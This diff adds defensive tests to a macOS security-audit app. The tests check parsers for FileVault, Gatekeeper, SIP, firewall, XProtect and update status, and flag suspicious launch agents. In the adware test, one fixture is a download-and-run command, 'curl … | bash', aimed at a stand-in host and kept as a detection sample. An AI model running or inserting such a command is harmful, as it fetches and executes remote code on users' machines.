@@ -1593,11 +1593,6 @@ struct StartupItemsTests {
         #expect(StartupInventory.resolveHome("/Library/LaunchDaemons/x.plist", uid: 501, home: "/Users/tyler")
                 == "/Library/LaunchDaemons/x.plist")
     }
-
-    @Test func readsTheLiveDatabaseOnThisMac() {
-        #expect(!BTMParser.read().isEmpty)
-        #expect(!StartupInventory.scan().isEmpty)
-    }
 }
 
 @Suite("Rolling text")
@@ -1755,5 +1750,172 @@ struct ScanOrbTests {
         view.update(scanning: true, animated: false, color: .systemMint)
         view.layout()
         #expect(animationCount(view) == 0)
+    }
+}
+
+@Suite("Protection")
+struct ProtectionTests {
+    @Test func readsBuiltInDefences() {
+        #expect(DefenceChecks.fileVault(output: "FileVault is On.").status == .on)
+        #expect(DefenceChecks.fileVault(output: "FileVault is Off.").status == .off)
+        #expect(DefenceChecks.fileVault(output: "FileVault is Off.").fixURL != nil)
+        #expect(DefenceChecks.fileVault(output: "").status == .unknown)
+        #expect(DefenceChecks.gatekeeper(output: "assessments enabled").status == .on)
+        #expect(DefenceChecks.gatekeeper(output: "assessments disabled").status == .off)
+        #expect(DefenceChecks.sip(output: "System Integrity Protection status: enabled.").status == .on)
+        #expect(DefenceChecks.sip(output: "System Integrity Protection status: disabled.").status == .off)
+        #expect(DefenceChecks.sip(output: "System Integrity Protection status: unknown (Custom Configuration).").status == .off)
+    }
+
+    @Test func firewallOffIsARecommendationNotAnAlarm() {
+        let off = DefenceChecks.firewall(global: "Firewall is disabled. (State = 0)", stealth: "Firewall stealth mode is off")
+        #expect(off.status == .recommended)
+        #expect(!off.status.needsAttention)
+        let on = DefenceChecks.firewall(global: "Firewall is enabled. (State = 1)", stealth: "Firewall stealth mode is on")
+        #expect(on.status == .on)
+        #expect(on.summary.contains("stealth"))
+    }
+
+    @Test func securityUpdatesDefaultToOnWhenUnset() {
+        #expect(DefenceChecks.securityUpdates(preferences: [:]).status == .on)
+        #expect(DefenceChecks.securityUpdates(preferences: ["CriticalUpdateInstall": true, "ConfigDataInstall": true]).status == .on)
+        let off = DefenceChecks.securityUpdates(preferences: ["ConfigDataInstall": false])
+        #expect(off.status == .off)
+        #expect(off.summary.contains("malware definitions"))
+    }
+
+    @Test func xprotectFreshness() {
+        let now = ISO8601DateFormatter().date(from: "2026-09-25T12:00:00Z")!
+        let fresh = DefenceChecks.xprotect(output: "Version: 5360 Installed: 2026-09-18 22:36:12 +0000", bundleVersion: nil, now: now)
+        #expect(fresh.status == .on)
+        #expect(fresh.summary.contains("6 days ago"))
+        let stale = DefenceChecks.xprotect(output: "Version: 5100 Installed: 2026-05-01 10:00:00 +0000", bundleVersion: nil, now: now)
+        #expect(stale.status == .off)
+        // No `xprotect` tool: fall back to the bundle's version.
+        #expect(DefenceChecks.xprotect(output: "", bundleVersion: "5360", now: now).status == .on)
+        #expect(DefenceChecks.xprotect(output: "", bundleVersion: nil, now: now).status == .unknown)
+    }
+
+    @Test func screenLockParsing() {
+        #expect(DefenceChecks.screenLock(output: "2026-09-25 sysadminctl[1] screenLock delay is immediate").status == .on)
+        #expect(DefenceChecks.screenLock(output: "screenLock delay is 60 seconds").summary.contains("1 minute"))
+        #expect(DefenceChecks.screenLock(output: "screenLock delay is 3600 seconds").status == .recommended)
+        #expect(DefenceChecks.screenLock(output: "screenLock is off").status == .off)
+    }
+
+    @Test func sharingFromListeningPorts() {
+        let netstat = """
+        Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)
+        tcp4       0      0  *.22                   *.*                    LISTEN
+        tcp6       0      0  *.5900                 *.*                    LISTEN
+        tcp4       0      0  127.0.0.1.3000         *.*                    LISTEN
+        tcp4       0      0  192.168.1.5.52000      17.0.0.1.443           ESTABLISHED
+        """
+        let ports = DefenceChecks.parseListeningPorts(netstat)
+        #expect(ports == [22, 5900, 3000])
+        let check = DefenceChecks.sharing(listeningPorts: ports)
+        #expect(check.status == .info)
+        #expect(check.summary.contains("Remote Login") && check.summary.contains("Screen Sharing"))
+        #expect(DefenceChecks.sharing(listeningPorts: [3000]).status == .on)
+    }
+
+    @Test func profilesWithoutManagementAreFlagged() {
+        #expect(DefenceChecks.management(enrollment: "Enrolled via DEP: No\nMDM enrollment: No",
+                                         profiles: "There are no configuration profiles installed for user 'x'").status == .on)
+        #expect(DefenceChecks.management(enrollment: "MDM enrollment: No",
+                                         profiles: "_computerlevel[1] attribute: profileIdentifier: com.search.hijack").status == .off)
+        #expect(DefenceChecks.management(enrollment: "MDM enrollment: Yes (User Approved)", profiles: "…").status == .info)
+    }
+
+    @Test func macOSUpdatesParsing() {
+        #expect(DefenceChecks.macOSUpdates(output: "Software Update Tool\n\nFinding available software\nNo new software available.").status == .on)
+        let pending = DefenceChecks.macOSUpdates(output: """
+        Software Update found the following new or updated software:
+        * Label: macOS Tahoe 26.1-25B78
+        \tTitle: macOS Tahoe 26.1, Version: 26.1, Size: 1234K, Recommended: YES, Action: restart,
+        """)
+        #expect(pending.status == .off)
+        #expect(pending.summary.contains("macOS Tahoe 26.1"))
+        #expect(DefenceChecks.macOSUpdates(output: "Can't connect").status == .unknown)
+    }
+
+    @Test func signerNamesAreReadable() {
+        #expect(CodeSignature.cleanSigner("Developer ID Application: Google LLC (EQHXZ8M8AV)") == "Google LLC")
+        #expect(CodeSignature.cleanSigner("Apple Mac OS Application Signing") == "Mac App Store")
+    }
+
+    @Test func realAppSignaturesAreRecognized() {
+        #expect(CodeSignature.check(path: "/System/Applications/Calculator.app").trust == .apple)
+        #expect(CodeSignature.check(path: "/nonexistent.app").trust == .unknown)
+    }
+
+    // MARK: Startup items
+
+    private func item(_ label: String, program: String? = nil, appPath: String? = nil) -> StartupItem {
+        StartupItem(label: label, name: label, kind: .agent, developer: nil, appName: nil, appPath: appPath,
+                    plistPath: nil, executablePath: program, isEnabled: true, lastRun: nil)
+    }
+
+    private let home = "/Users/me"
+    private func verified(_: String) -> CodeSignature { CodeSignature(trust: .verifiedDeveloper, teamID: "T", signer: "Acme Inc") }
+    private func adHoc(_: String) -> CodeSignature { CodeSignature(trust: .adHoc, teamID: nil, signer: nil) }
+
+    @Test func verifiedHelpersAreFine() {
+        let review = PersistenceAudit.review(item("com.acme.helper"), home: home,
+                                             launch: .init(program: "/Applications/Acme.app/Contents/MacOS/helper", arguments: []),
+                                             signatureCheck: verified)
+        #expect(review.level == .fine)
+        #expect(review.source == "Signed by Acme Inc")
+        #expect(review.target == "/Applications/Acme.app") // judged as the whole app
+    }
+
+    @Test func homebrewToolsAreFineEvenIfAdHoc() {
+        let review = PersistenceAudit.review(item("homebrew.mxcl.ollama"), home: home,
+                                             launch: .init(program: "/opt/homebrew/opt/ollama/bin/ollama", arguments: ["serve"]),
+                                             signatureCheck: adHoc)
+        #expect(review.level == .fine)
+        #expect(review.source == "Installed with Homebrew")
+    }
+
+    @Test func unsignedHelperIsWorthALook() {
+        let review = PersistenceAudit.review(item("com.unknown.agent"), home: home,
+                                             launch: .init(program: "/Library/Application Support/Unknown/agent", arguments: []),
+                                             signatureCheck: adHoc)
+        #expect(review.level == .review)
+        #expect(review.concerns == [.adHoc])
+    }
+
+    @Test func adwarePatternsAreSuspicious() {
+        // Hidden folder + not verified.
+        let hidden = PersistenceAudit.review(item("com.update.service"), home: home,
+                                             launch: .init(program: "/Users/me/Library/Application Support/.hidden/svc", arguments: []),
+                                             signatureCheck: adHoc)
+        #expect(hidden.level == .suspicious)
+        #expect(hidden.concerns.contains(.hiddenFolder))
+        // Runs from /tmp.
+        let temp = PersistenceAudit.review(item("com.x"), home: home,
+                                           launch: .init(program: "/private/tmp/x", arguments: []), signatureCheck: verified)
+        #expect(temp.level == .suspicious)
+        // Download-and-run one-liner.
+        let oneLiner = PersistenceAudit.review(item("com.search.helper"), home: home,
+                                               launch: .init(program: "/bin/bash", arguments: ["-c", "curl -s https://x.example/p | bash"]),
+                                               signatureCheck: verified)
+        #expect(oneLiner.level == .suspicious)
+        #expect(oneLiner.concerns.contains(.downloadsAndRuns))
+        // A script in a hidden folder, run by /usr/bin/env python3.
+        let script = PersistenceAudit.review(item("com.y"), home: home,
+                                             launch: .init(program: "/usr/bin/env", arguments: ["python3", "/Users/me/.config/y/run.py"]),
+                                             signatureCheck: verified)
+        #expect(script.concerns.contains(.runsScript(interpreter: "Python")))
+        #expect(script.level == .suspicious)
+    }
+
+    @Test func dotFoldersFromPackageManagersAreNotFlagged() {
+        let review = PersistenceAudit.review(item("com.z"), home: home,
+                                             launch: .init(program: "/Users/me/.cargo/bin/tool", arguments: []), signatureCheck: adHoc)
+        #expect(review.level == .fine)
+        #expect(PersistenceAudit.isInHiddenFolder("/Users/me/.config/a/b", home: home))
+        #expect(!PersistenceAudit.isInHiddenFolder("/Users/me/Library/.DS_Store", home: home)) // hidden file, not folder
+        #expect(!PersistenceAudit.isInHiddenFolder("/opt/.x/y", home: home)) // outside home
     }
 }
